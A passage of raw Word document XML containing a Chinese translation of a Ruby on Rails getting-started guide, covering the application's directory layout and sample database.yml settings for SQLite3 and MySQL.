          <w:p w14:paraId="3D252D1E" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="002A2B82">
            <w:pPr>
              <w:widowControl/>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:b/>
                <w:bCs/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Purpose</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3BD1C24D" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="07B9565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app/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6C31568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包含 controllers, models, views 和 你应用程序的 assets（资源），再接下面的手册中你主要的注意力应该放在这里。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="771D1B75" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7917D99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config/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="23044D7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配置你的应用程序的运行的规则，（url）路由，数据库和其他，更多的信息查看 </w:t>
            </w:r>
            <w:hyperlink r:id="rId73" w:history="1">
              <w:r w:rsidRPr="002F7037">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>Configuring Rails Applications</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="42F8CBF4" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="32B3450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config.ru</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="226CCCC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基于 Rack 服务器使用这个应用程序的 Rack 配置用于开始应用程序（Rack configuration for Rack based servers used to start the application）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="359DAE9B" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DB52B6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db/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="0A4FE1F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显示你当前的数据库结构（database schema），同样也显示数据迁移。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="6F867B84" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7D40484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doc/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="262188B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应用程序的（深入）全面的文档。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="057849BB" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="153D692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Gemfile</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:br/>
              <w:t>Gemfile.lock</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6FF7836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这个文件让你可以（添加）你的 Rails 所需要的特殊的 Gem 依赖关系。这个文件被 Bundler gem 使用，更多的信息查看 </w:t>
            </w:r>
            <w:hyperlink r:id="rId74" w:history="1">
              <w:r w:rsidRPr="002F7037">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>the Bundler website</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="49CE9976" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="72B1399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lib/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="13FC1C1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应用程序用到的扩展库（本手册没有涉及）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="36ADBE9B" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="15E22E6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log/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="211B7D9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应用程序的日志文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="649CA9B5" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4276155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public/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="471DFDC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这是</w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>外部可见的唯一文件夹</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>。包含</w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>静态文件</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>和</w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:highlight w:val="green"/>
              </w:rPr>
              <w:t>编译资源</w:t>
            </w:r>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7229582B" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6927615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Rakefile</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="26CF1A1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这个文件定位和载入能够在命令行中运行的任务。这个任务定义贯穿整个 Rails 的组件。除了修改 Rakefile，你更应该添加你自己的任务的文件到你的应用程序的 lib/tasks 目录。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="7A60B321" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="37286C1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README.rdoc</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="24C6D18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这是一个简单的说明手册。你需要编辑这个文件告诉其他人你的应用程序可以做什么，怎么安装等等。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="1E866FDB" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6AC4F4B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script/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="20EC264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包含运行你的 app 的 rails 脚本，或者其他用来配置或运行你的应用程序的 scripts。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="3EFA1C8E" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="267DDF2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test/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45E6B6A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单元测试， fixtures，或者其他 test 工具。他们在 </w:t>
            </w:r>
            <w:hyperlink r:id="rId75" w:history="1">
              <w:r w:rsidRPr="002F7037">
                <w:rPr>
                  <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                  <w:color w:val="0000FF"/>
                  <w:kern w:val="0"/>
                  <w:sz w:val="24"/>
                  <w:szCs w:val="24"/>
                  <w:u w:val="single"/>
                </w:rPr>
                <w:t>Testing Rails Applications</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="002F7037">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t xml:space="preserve"> 里面有完整的讲述。</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="67946572" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1C263F0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tmp/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="024D391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临时文件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="005D6D6E" w:rsidRPr="002F7037" w14:paraId="1183F92E" w14:textId="77777777" w:rsidTr="00142ECF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4304BFC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vendor/</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="283EEFD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放置第三方代码的地方。在一个典型的 Rails 应用程序中，这里包含 Ruby Gems，Rails 源代码（如果你把 Rails 安装到你的项目中）还包含一些预先包装好的</w:t>
            </w:r>
            <w:r w:rsidRPr="00142ECF">
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:kern w:val="0"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>额外的插件</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0EFB06AC"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6 配置一个数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F3BA75C"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几乎每个 Rails 应用程序都会和一个数据库交互。使用的数据库在一个配置文件 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 中被指定。如果你打开一个在新的 Rails 应用程序的中的配置文件，你将会看到默认的数据库被配置使用 SQLite3。这个文件包含 Rails 默认能够运行的三个不同环境的部分：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E905B13" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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development 环境被使用在你的开发/本地计算机作为你与应用程序的手动交互。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4302BBE6" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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test 环境被使用来运行自动测试。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5AEF31C8" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="14"/>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production 环境在你部署你的应用程序给所有人使用的时候使用。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2555AD95"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你不需要必须手动的更新数据库配置。如果你查看应用程序创建器的选项，你将会发现其中一个选项叫—— database。这个选项允许你从最常使用的关系数据库列表中选择一个适配器。你甚至可以反复运行创建器命令： </w:t>
      </w:r>
      <w:r w:rsidRPr="00142ECF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:highlight w:val="green"/>
        </w:rPr>
        <w:t>cd .. &amp;&amp; rails new blog —database=mysql</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">。当你确认重写 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 文件，你的应用程序将会被配置为 MySQL 替代 SQLite。这些一般数据库连接的详细的例子在下面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62F1047E"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6.1 配置一个 SQLite3 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53464E08"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Rails 内置支持 </w:t>
      </w:r>
      <w:hyperlink r:id="rId76" w:history="1">
        <w:r w:rsidRPr="002F7037">
          <w:rPr>
            <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
            <w:color w:val="0000FF"/>
            <w:kern w:val="0"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>SQLite</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> ，这是一个轻量级的非服务器，（serverless）数据库应用程序。即使一个繁忙的产品环境可能会超出 SQLite （所能），它在开发和测试环境能够很好的工作。Rails 在创建一个新的项目的时候默认使用一个 SQLite 数据库，但是你总是可以在以后改变它。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2C773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这里是一个开发环境（数据库）连接信息默认配置文件(</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>)的节选：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03E5C7C2" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="005D6D6E" w:rsidP="005D6D6E">
      <w:pPr>
        <w:widowControl/>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00142ECF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">development: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="212D03FE" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRPr="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="00142ECF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>adapter: sqlite3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FEE8AF" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRPr="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="00142ECF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>database: db/development.sqlite3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C31715F" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRPr="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="00142ECF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>pool: 5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FD6FD49" w14:textId="77777777" w:rsidR="005D6D6E" w:rsidRPr="002F7037" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="00142ECF">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>timeout: 5000</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55BFC710"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在这个教程中我们使用一个 SQLite3 数据库来存储数据，因为它是一个零配置数据库其就可以工作。Rails 同样也支持 MySQL 和 PostgreSQL “开箱即用的”，以及很多数据库系统的插件。如果你正在产品环境中使用一个数据库大多数情况下 Rails 都有一个与之相应的插件。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3944A015"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6.2 配置一个 MySQL 数据库</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18BE155B"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如果你选择使用一个 MySQL 替代（项目初始化）附带的 SQLite3 数据库，你的 </w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
        </w:rPr>
        <w:t>config/database.yml</w:t>
      </w:r>
      <w:r w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 将会看起来有些不同。这里是 development 部分：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F4601B9" w14:textId="77777777" w:rsidR="00142ECF"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development: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BBD02DA" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">adapter: mysql2 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D234D92" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">encoding: utf8 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E63B4DA" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">database: blog_development </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="121DEEBB" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:tab/>
      </w:r>
      <w:r w:rsidR="005D6D6E" w:rsidRPr="002F7037">
        <w:rPr>
          <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">pool: 5 </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="215C461D" w14:textId="77777777" w:rsidR="00142ECF" w:rsidRDefault="00142ECF"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hint="eastAsia"/>
          <w:kern w:val="0"/>
